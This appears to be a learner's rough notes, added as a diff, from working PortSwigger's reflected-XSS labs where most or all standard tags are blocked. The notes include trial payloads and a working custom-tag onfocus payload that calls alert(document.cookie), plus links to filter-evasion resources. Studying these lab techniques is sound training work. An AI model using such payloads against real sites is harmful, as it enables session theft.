@@ -1,0 +1,108 @@
+Lab: Reflected XSS into HTML context with most tags and attributes blocked 
+https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
+&lt;script&rt;
+
+<script>alert(document.cookie)</script>
+
+this didn't seem to work 
+
+HMMMM
+
+https://stackoverflow.com/questions/5068951/what-do-lt-and-gt-stand-for#:~:text=%3E%20and%20%3C%20is%20a,(%20%3C%20).
+
+'&lt;script&gt;alert(document.cookie)&lt;/script&gt;'
+
+the search result is rendered as an h1 
+
+what does the below input do? 
+yeeeeee&lt;/h1&gt;
+
+'&lt;h2&gt;yeeeeee&lt;/h2&gt';
+
+'yeeeeee&lt;/h1&gt;'
+
+
+hello'&lt;h2&gt;yeeeeee&lt;/h2&gt;'there
+
+&#39 is the html code for '
+
+&#39;&lt;h2&gt;yeeeeee&lt;/h2&gt;&#39;
+
+&lt;/h1&gt;
+
+what is an html context???
+https://html.spec.whatwg.org/multipage/browsers.html
+
+can I put in a link?
+
+url encoder
+https://meyerweb.com/eric/tools/dencoder/
+
+hmmm you can try double encoding
+https://owasp.org/www-community/Double_Encoding
+
+I don't know if I fully understand this article yet but I know I'll get it, HMMM
+https://www.secjuice.com/xss-arithmetic-operators-chaining-bypass-sanitization/
+
+
+this looks interesting too
+https://mazinahmed.net/uploads/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf
+
+this doesn't work, but body does not appear in the output 
+<body style="color:red">helllo<script>test</script></body>
+
+hmmm
+
+<body style="color:red">helllo&lt;script&gt;test&lt/script&gt;there</body>
+
+nope, does not work... 
+
+
+<body style="color:red">helllo&lt;script&gt;test&lt/script&gt;there</body>
+
+
+<body style="color:red">helllo&lt;script&gt;test&lt/script&gt;there</body>
+
+ononline isn't blocked 
+
+hmmm there is this cheat sheet here 
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+I copied and pasted this into the url 
+<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
+and it worked, but I don't fully understand how. I don't understand how that # makes it focus on that object. 
+And what is the x at the end of the URL for? 
+
+so I might have been doing something wrong, I should attack the url, not the box. hmmm
+
+this link is def useful 
+https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
+
+------
+this is for the same lab but the one where all tags are disabled except custom ones... 
+this works when you click on it
+<xss onclick="alert(document.cookie)">test</xss>
+
+but I have to get the alert to show up when the page loads. somehow
+
+onload only works for certain tags, so lets see if there are any global tags... hmmmm
+
+https://www.w3schools.com/tags/ref_standardattributes.asp
+
+hmmm well according to this, onload should work for anything
+https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes
+
+maybe testing it here will help me figure out if i can get it to work?
+https://www.w3schools.com/tags/tryit.asp?filename=tryhtml5_ev_onpageshow
+
+so i see that the <xss> tag is rendered...
+'<xss>yee</xss>
+
+using href only works with <a>
+https://www.w3schools.com/tags/att_a_href.asp
+
+can i get an a in there somehow???
+<xss onclick="alert(document.cookie)">&lt;a&gt;</xss>
+
+<xss onclick="alert(document.cookie)">&lt;a href="javascript:alert(1)&gt;test&lt;/a&gt;</xss>
+
